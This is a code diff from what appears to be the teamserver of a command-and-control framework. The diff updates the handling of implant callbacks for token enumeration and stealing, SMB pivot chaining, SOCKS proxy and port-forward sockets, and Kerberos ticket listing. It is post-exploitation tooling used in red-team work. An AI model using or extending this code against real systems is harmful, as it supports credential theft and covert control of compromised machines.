+							for NumTokens > 0 && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
+								DomainAndUser = Parser.ParseUTF16String()
+								ProcessPID = Parser.ParseInt32()
+								localHandle = Parser.ParseInt32()
+								integrity_level = Parser.ParseInt32()
+								impersonation_level = Parser.ParseInt32()
+								TokenType = Parser.ParseInt32()
+
+								if integrity_level <= SECURITY_MANDATORY_LOW_RID {
+									integrity = "Low"
+								} else if integrity_level >= SECURITY_MANDATORY_MEDIUM_RID && integrity_level < SECURITY_MANDATORY_HIGH_RID {
+									integrity = "Medium"
+								} else if integrity_level >= SECURITY_MANDATORY_HIGH_RID && integrity_level < SECURITY_MANDATORY_SYSTEM_RID {
+									integrity = "High"
+								} else if integrity_level >= SECURITY_MANDATORY_SYSTEM_RID {
+									integrity = "System"
 								}
-							}
 
-							Buffer += "\nImpersonation Tokens Available\n"
-							Buffer += "========================================\n"
+								RemoteAuth = "No"
+								if TokenType == TokenImpersonation {
+									Type = "Impersonation"
 
-							if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
-
-								NumImpTokens = Parser.ParseInt32()
-
-								if NumImpTokens == 0 {
-									Buffer += "(No tokens found)\n"
+									if impersonation_level == SecurityAnonymous {
+										impersonation = "Anonymous"
+									} else if impersonation_level == SecurityIdentification {
+										impersonation = "Identification"
+									} else if impersonation_level == SecurityImpersonation {
+										impersonation = "Impersonation"
+									} else if impersonation_level == SecurityDelegation {
+										impersonation = "Delegation"
+										RemoteAuth = "Yes"
+									}
+								} else if TokenType == TokenPrimary {
+									Type = "Primary"
+									impersonation = "N/A"
+									RemoteAuth = "Yes"
 								} else {
-									for NumImpTokens > 0 && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32}) {
-										DomainAndUser = Parser.ParseString()
-										ProcessPID    = Parser.ParseInt32()
-										localHandle   = Parser.ParseInt32()
-										if localHandle != 0 {
-											Buffer += fmt.Sprintf("- User: %s, Process: %d, handle: %x\n", DomainAndUser, ProcessPID, localHandle )
-										} else {
-											Buffer += fmt.Sprintf("- User: %s, Process: %d\n", DomainAndUser, ProcessPID )
-										}
-										NumImpTokens--
-									}
+									Type = "?"
 								}
 
-								Output["Type"] = "Info"
-								Output["Message"] = "Tokens available:"
-								Output["Output"] = "\n" + Buffer
-								a.RequestCompleted(RequestID)
-							} else {
-								logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_FIND_TOKENS, Invalid packet: %d", AgentID))
+								Array = append(Array, []any{DomainAndUser, integrity, Type, impersonation, "Yes", RemoteAuth, ProcessPID, fmt.Sprintf("%x", localHandle)})
+
+								if len(DomainAndUser) > MaxString {
+									MaxString = len(DomainAndUser)
+								}
+
+								NumTokens--
 							}
 
+							if FoundTokens == true {
+								if MaxString < 13 {
+									MaxString = 13
+								}
+
+								FmtString = fmt.Sprintf(" %%-%vv  %%-9v  %%-13v  %%-16v  %%-9v %%-10v %%-9v %%-9v\n", MaxString)
+
+								Buffer += fmt.Sprintf(FmtString, " Domain\\User", "Integrity", "TokenType", "Impersonation LV", "LocalAuth", "RemoteAuth", "ProcessID", "Handle")
+								Buffer += fmt.Sprintf(FmtString, strings.Repeat("-", MaxString), "---------", "-------------", "----------------", "---------", "----------", "---------", "------")
+
+								for _, item := range Array {
+									if item[7] == "0" {
+										item[7] = ""
+									}
+									Buffer += fmt.Sprintf(FmtString, item[0], item[1], item[2], item[3], item[4], item[5], item[6], item[7])
+								}
+
+								Buffer += "\nTo impersonate a user, run: token steal [process id] (handle)"
+							} else {
+								Buffer += "No tokens found"
+							}
+
+							Output["Type"] = "Info"
+							Output["Message"] = "Tokens available:"
+							Output["Output"] = "\n" + Buffer
+							a.RequestCompleted(RequestID)
 						} else {
 							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_FIND_TOKENS, Invalid packet: %d", AgentID))
 						}
-
 					} else {
 						Output["Type"] = typeError
 						Output["Message"] = "Failed to list existing tokens"
@@ -4932,7 +5006,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 										}
 
 										for i := range DemonInfo.Pivots.Parent.Pivots.Links {
-											if DemonInfo.Pivots.Parent.Pivots.Links[i].NameID == fmt.Sprintf("%x", AgentHdr.AgentID) {
+											if DemonInfo.Pivots.Parent.Pivots.Links[i].NameID == fmt.Sprintf("%08x", AgentHdr.AgentID) {
 												DemonInfo.Pivots.Parent.Pivots.Links = append(DemonInfo.Pivots.Parent.Pivots.Links[:i], DemonInfo.Pivots.Parent.Pivots.Links[i+1:]...)
 												break
 											}
@@ -5024,7 +5098,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 						Message["Message"] = fmt.Sprintf("[SMB] Agent disconnected %x", AgentID)
 
 						Message["MiscType"] = "disconnect"
-						Message["MiscData"] = fmt.Sprintf("%x", AgentID)
+						Message["MiscData"] = fmt.Sprintf("%08x", AgentID)
 
 						AgentInstance := teamserver.AgentInstance(AgentID)
 						if AgentInstance != nil {
@@ -5061,14 +5135,30 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					if err == nil {
 
 						if AgentHdr.MagicValue == DEMON_MAGIC_VALUE {
-							var Request    = AgentHdr.Data.ParseInt32()
-							var Command    = AgentHdr.Data.ParseInt32()
 							var PivotAgent *Agent
 
 							PivotAgent = teamserver.AgentInstance(AgentHdr.AgentID)
 							if PivotAgent != nil {
 								//logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_COMMAND, Linked Agent: %s, Command: %d", AgentID, PivotAgent.NameID, Command))
-								PivotAgent.TaskDispatch(uint32(Request), uint32(Command), AgentHdr.Data, teamserver)
+
+								// while we can read a command and request id, parse new packages
+								first_iter := true
+								for (AgentHdr.Data.CanIRead(([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}))) {
+									var Command   = uint32(AgentHdr.Data.ParseInt32())
+									var Request   = uint32(AgentHdr.Data.ParseInt32())
+
+									if first_iter {
+										first_iter = false
+										// if the message is not a reconnect, decrypt the buffer
+										AgentHdr.Data.DecryptBuffer(PivotAgent.Encryption.AESKey, PivotAgent.Encryption.AESIv)
+									}
+
+									/* The agent is sending us the result of a task */
+									if Command != COMMAND_GET_JOB {
+										Parser := parser.NewParser(AgentHdr.Data.ParseBytes())
+										PivotAgent.TaskDispatch(Request, Command, Parser, teamserver)
+									}
+								}
 							} else {
 								Message["Type"] = "Error"
 								Message["Message"] = fmt.Sprintf("Can't process output for %x: Agent not found", AgentHdr.AgentID)
@@ -5518,7 +5608,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 										var job = Job{
 											Command: COMMAND_SOCKET,
 											Data: []any{
-												SOCKET_COMMAND_READ_WRITE,
+												SOCKET_COMMAND_WRITE,
 												Socket.SocktID,
 												Data,
 											},
@@ -5550,63 +5640,104 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 				break
 
-			case SOCKET_COMMAND_READ_WRITE:
-				/* if we receive the SOCKET_COMMAND_READ_WRITE command
+			case SOCKET_COMMAND_READ:
+				/* if we receive the SOCKET_COMMAND_READ command
 				 * that means that we should read the callback and send it to the forwared host/socks proxy */
 
-				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadBytes}) {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
 					var (
-						Id   = Parser.ParseInt32()
-						Type = Parser.ParseInt32()
-						Data = Parser.ParseBytes()
+						Id      = Parser.ParseInt32()
+						Type    = Parser.ParseInt32()
+						Success = Parser.ParseInt32()
 					)
 
-					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ_WRITE, Id: %x, Type: %d, DataLength: %x", AgentID, Id, Type, len(Data)))
+					if Success == win32.TRUE {
+						if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+							var(
+								Data = Parser.ParseBytes()
+							)
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ,    Id: %08x, Type: %d, DataLength: %x", AgentID, Id, Type, len(Data)))
 
-					if Type == SOCKET_TYPE_CLIENT {
+							if Type == SOCKET_TYPE_CLIENT {
 
-						/* check if there is a socket with that portfwd id */
-						if Socket := a.PortFwdGet(Id); Socket != nil {
+								/* check if there is a socket with that portfwd id */
+								if Socket := a.PortFwdGet(Id); Socket != nil {
 
-							/* write the data to the forwarded host */
-							err := a.PortFwdWrite(Id, Data)
-							if err != nil {
-								a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to reverse port forward host %s: %v", Socket.Target, err), "")
-								return
+									/* write the data to the forwarded host */
+									err := a.PortFwdWrite(Id, Data)
+									if err != nil {
+										a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to reverse port forward host %s: %v", Socket.Target, err), "")
+										return
+									}
+
+								} else {
+
+									logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))
+
+								}
+
+							} else if Type == SOCKET_TYPE_REVERSE_PROXY {
+
+								/* check if there is a socket with that socks proxy id */
+								if Socket := a.SocksClientGet(Id); Socket != nil {
+
+									/* write the data to socks proxy */
+									_, err := Socket.Conn.Write(Data)
+									if err != nil {
+										a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to socks proxy %v: %v", Id, err), "")
+
+										/* TODO: remove socks proxy client */
+										//a.SocksClientClose(SOCKET_TYPE_CLIENT)
+
+										return
+									}
+
+								} else {
+									logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))
+								}
 							}
-
 						} else {
-
-							logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))
-
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ,    Invalid packet", AgentID))
 						}
-
-					} else if Type == SOCKET_TYPE_REVERSE_PROXY {
-
-						/* check if there is a socket with that socks proxy id */
-						if Socket := a.SocksClientGet(Id); Socket != nil {
-
-							/* write the data to socks proxy */
-							_, err := Socket.Conn.Write(Data)
-							if err != nil {
-								a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to socks proxy %v: %v", Id, err), "")
-
-								/* TODO: remove socks proxy client */
-								//a.SocksClientClose(SOCKET_TYPE_CLIENT)
-
-								return
-							}
-
+					} else {
+						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+							var (
+								ErrorCode = Parser.ParseInt32()
+							)
+							logger.Warn(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ,    Id: %08x, Type: %d, Failed with: %d", AgentID, Id, Type, ErrorCode))
+							a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to read from socks target %v: %v", Id, ErrorCode), "")
 						} else {
-
-							logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))
-
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ,    Invalid packet", AgentID))
 						}
-
 					}
-
 				} else {
-					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ_WRITE, Invalid packet", AgentID))
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ,    Invalid packet", AgentID))
+				}
+
+				break
+
+			case SOCKET_COMMAND_WRITE:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
+					var (
+						Id      = Parser.ParseInt32()
+						Type    = Parser.ParseInt32()
+						Success = Parser.ParseInt32()
+					)
+
+					if Success == win32.FALSE {
+						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+							var (
+								ErrorCode = Parser.ParseInt32()
+							)
+							logger.Warn(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_WRITE, Id: %08x, Type: %d, Failed with: %d", AgentID, Id, Type, ErrorCode))
+							a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to socks target %v: %v", Id, ErrorCode), "")
+						} else {
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_WRITE, Invalid packet", AgentID))
+						}
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_WRITE, Invalid packet", AgentID))
 				}
 
 				break
@@ -5620,7 +5751,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 						Socket *PortFwd
 					)
 
-					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CLOSE, SockId: %x, Type: %d", AgentID, SockId, Type))
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CLOSE,   Id: %08x, Type: %d", AgentID, SockId, Type))
 
 					/* NOTE: for now the reverse port forward close command is not used. */
 					if Type == SOCKET_TYPE_REVERSE_PORTFWD || Type == SOCKET_TYPE_CLIENT {
@@ -5666,31 +5797,28 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 						ErrorCode = Parser.ParseInt32()
 					)
 
-					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CONNECT, Success: %d, SocketId: %x", AgentID, Success, SocketId))
-
 					if Client := a.SocksClientGet(SocketId); Client != nil {
 
 						if Success == win32.TRUE {
 							// succeeded
+
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CONNECT, Id: %08x, Type: %d, Success: %d", AgentID, SocketId, SOCKET_TYPE_REVERSE_PROXY, Success))
+
 							err := socks.SendConnectSuccess(Client.Conn, Client.ATYP, Client.IpDomain, Client.Port)
-							if err != nil {
-								return
+							if err == nil {
+								Client.Connected = true
 							}
-							Client.Connected = true
 
 						} else {
-							a.SocksClientClose(int32(SocketId))
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CONNECT, Id: %08x, Type: %d, Success: %d, ErrorCode: %d", AgentID, SocketId, SOCKET_TYPE_REVERSE_PROXY, Success, ErrorCode))
 
-							err := socks.SendConnectFailure(Client.Conn, uint32(ErrorCode))
-							if err != nil {
-								return
-							}
+							socks.SendConnectFailure(Client.Conn, uint32(ErrorCode), Client.ATYP, Client.IpDomain, Client.Port)
+
+							a.SocksClientClose(int32(SocketId))
 						}
 
 					} else {
-
-						logger.Error(fmt.Sprintf("Socket id not found: %x\n", SocketId))
-
+						logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CONNECT, Socket id not found: %x", AgentID, SocketId))
 					}
 
 				} else {
@@ -5744,7 +5872,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
 
 							HighPart = Parser.ParseInt32()
-							LowPart  = Parser.ParseInt32()
+							LowPart = Parser.ParseInt32()
 
 							Message = map[string]string{
 								"Type":    "Good",
@@ -5818,32 +5946,32 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 							for NumSessions > 0 && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes}) {
 
-								UserName              = Parser.ParseUTF16String()
-								Domain                = Parser.ParseUTF16String()
-								LogonIdLow            = Parser.ParseInt32()
-								LogonIdHigh           = Parser.ParseInt32()
-								Session               = Parser.ParseInt32()
-								UserSID               = Parser.ParseUTF16String()
-								LogonTimeLow          = Parser.ParseInt32()
-								LogonTimeHigh         = Parser.ParseInt32()
-								LogonType             = Parser.ParseInt32()
+								UserName = Parser.ParseUTF16String()
+								Domain = Parser.ParseUTF16String()
+								LogonIdLow = Parser.ParseInt32()
+								LogonIdHigh = Parser.ParseInt32()
+								Session = Parser.ParseInt32()
+								UserSID = Parser.ParseUTF16String()
+								LogonTimeLow = Parser.ParseInt32()
+								LogonTimeHigh = Parser.ParseInt32()
+								LogonType = Parser.ParseInt32()
 								AuthenticationPackage = Parser.ParseUTF16String()
-								LogonServer           = Parser.ParseUTF16String()
-								LogonServerDNSDomain  = Parser.ParseUTF16String()
-								Upn                   = Parser.ParseUTF16String()
+								LogonServer = Parser.ParseUTF16String()
+								LogonServerDNSDomain = Parser.ParseUTF16String()
+								Upn = Parser.ParseUTF16String()
 
 								LogonTypes := map[int]string{
-									win32.LOGON32_LOGON_INTERACTIVE: "Interactive",
-									win32.LOGON32_LOGON_NETWORK: "Network",
-									win32.LOGON32_LOGON_BATCH: "Batch",
-									win32.LOGON32_LOGON_SERVICE: "Service",
-									win32.LOGON32_LOGON_UNLOCK: "Unlock",
+									win32.LOGON32_LOGON_INTERACTIVE:       "Interactive",
+									win32.LOGON32_LOGON_NETWORK:           "Network",
+									win32.LOGON32_LOGON_BATCH:             "Batch",
+									win32.LOGON32_LOGON_SERVICE:           "Service",
+									win32.LOGON32_LOGON_UNLOCK:            "Unlock",
 									win32.LOGON32_LOGON_NETWORK_CLEARTEXT: "Network_Cleartext",
-									win32.LOGON32_LOGON_NEW_CREDENTIALS: "New_Credentials",
+									win32.LOGON32_LOGON_NEW_CREDENTIALS:   "New_Credentials",
 								}
 
 								// go from FILETIME to SYSTEMTIME
-								LogonTime = int64( ( ( ( LogonTimeHigh << ( 4 * 8 ) ) | LogonTimeLow ) - 0x019DB1DED53E8000 ) / 10000000 )
+								LogonTime = int64((((LogonTimeHigh << (4 * 8)) | LogonTimeLow) - 0x019DB1DED53E8000) / 10000000)
 
 								Output += fmt.Sprintf("UserName                : %s\n", UserName)
 								Output += fmt.Sprintf("Domain                  : %s\n", Domain)
@@ -5864,24 +5992,24 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 									for NumTickets > 0 && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes}) {
 
-										ClientName     = Parser.ParseUTF16String()
-										ClientRealm    = Parser.ParseUTF16String()
-										ServerName     = Parser.ParseUTF16String()
-										ServerRealm    = Parser.ParseUTF16String()
-										StartTimeLow   = Parser.ParseInt32()
-										StartTimeHigh  = Parser.ParseInt32()
-										EndTimeLow     = Parser.ParseInt32()
-										EndTimeHigh    = Parser.ParseInt32()
-										RenewTimeLow   = Parser.ParseInt32()
-										RenewTimeHigh  = Parser.ParseInt32()
+										ClientName = Parser.ParseUTF16String()
+										ClientRealm = Parser.ParseUTF16String()
+										ServerName = Parser.ParseUTF16String()
+										ServerRealm = Parser.ParseUTF16String()
+										StartTimeLow = Parser.ParseInt32()
+										StartTimeHigh = Parser.ParseInt32()
+										EndTimeLow = Parser.ParseInt32()
+										EndTimeHigh = Parser.ParseInt32()
+										RenewTimeLow = Parser.ParseInt32()
+										RenewTimeHigh = Parser.ParseInt32()
 										EncryptionType = Parser.ParseInt32()
-										TicketFlags    = Parser.ParseInt32()
-										Ticket         = Parser.ParseBytes()
+										TicketFlags = Parser.ParseInt32()
+										Ticket = Parser.ParseBytes()
 
 										// go from FILETIME to SYSTEMTIME
-										StartTime = int64( ( ( ( StartTimeHigh << ( 4 * 8 ) ) | StartTimeLow ) - 0x019DB1DED53E8000 ) / 10000000 )
-										EndTime   = int64( ( ( (   EndTimeHigh << ( 4 * 8 ) ) | EndTimeLow )   - 0x019DB1DED53E8000 ) / 10000000 )
-										RenewTime = int64( ( ( ( RenewTimeHigh << ( 4 * 8 ) ) | RenewTimeLow ) - 0x019DB1DED53E8000 ) / 10000000 )
+										StartTime = int64((((StartTimeHigh << (4 * 8)) | StartTimeLow) - 0x019DB1DED53E8000) / 10000000)
+										EndTime = int64((((EndTimeHigh << (4 * 8)) | EndTimeLow) - 0x019DB1DED53E8000) / 10000000)
+										RenewTime = int64((((RenewTimeHigh << (4 * 8)) | RenewTimeLow) - 0x019DB1DED53E8000) / 10000000)
 
 										EncryptionTypes := map[int]string{
 											win32.DES_CBC_CRC:                  "DES_CBC_CRC",
@@ -5905,8 +6033,8 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 										}
 
 										TicketFlagTypes := []string{
-											"name_canonicalize", 
-											"anonymous", 
+											"name_canonicalize",
+											"anonymous",
 											"ok_as_delegate",
 											"?",
 											"hw_authent",
@@ -5926,7 +6054,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 										TicketFlagsStr = ""
 
 										for i := 0; i < 16; i++ {
-											if ((TicketFlags >> (i  + 16)) & 1) == 1 {
+											if ((TicketFlags >> (i + 16)) & 1) == 1 {
 												TicketFlagsStr += " " + TicketFlagTypes[i]
 											}
 										}
@@ -5957,8 +6085,8 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 							}
 
 							Message = map[string]string{
-								"Type":    "Info",
-								"Output":  Output,
+								"Type":   "Info",
+								"Output": Output,
 							}
 							a.RequestCompleted(RequestID)
 						} else {
